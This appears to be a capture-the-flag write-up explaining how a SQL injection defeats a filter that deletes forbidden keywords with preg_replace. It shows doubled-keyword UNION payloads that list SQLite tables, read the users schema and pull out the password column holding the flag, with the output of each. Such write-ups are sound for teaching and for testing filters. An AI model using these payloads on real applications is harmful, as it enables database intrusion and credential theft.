Saw that the ```preg_replace()``` function just finds the forbidden words and removes them, this instantly raised a red flag for me because the code keeps running without those names even if found.
I bypassed this by putting instead of ```SELECT``` => ```SSELECTELECT```, so the middle ```SELECT``` would get removed but there would still be the outer ```SELECT``` left.
I did this for all of my queries and got these results:

```-1 AND 0=1 UUNIONNION SSELECTELECT 1, (SSELECTELECT ggrouproup_concat(name) FFROMROM sqlite_master)```
output:
Other User Details:
id -> 1
username -> users

```-1 AND 0=1 UUNIONNION SSELECTELECT 1, (SSELECTELECT sql FFROMROM sqlite_master WHERE name = 'users')```
output:
Other User Details:
id -> 1
username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))

```-1 AND 0=1 UUNIONNION SSELECTELECT 1, (SSELECTELECT password FFROMROM users)```
output:
Other User Details:
id -> 1
username -> WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
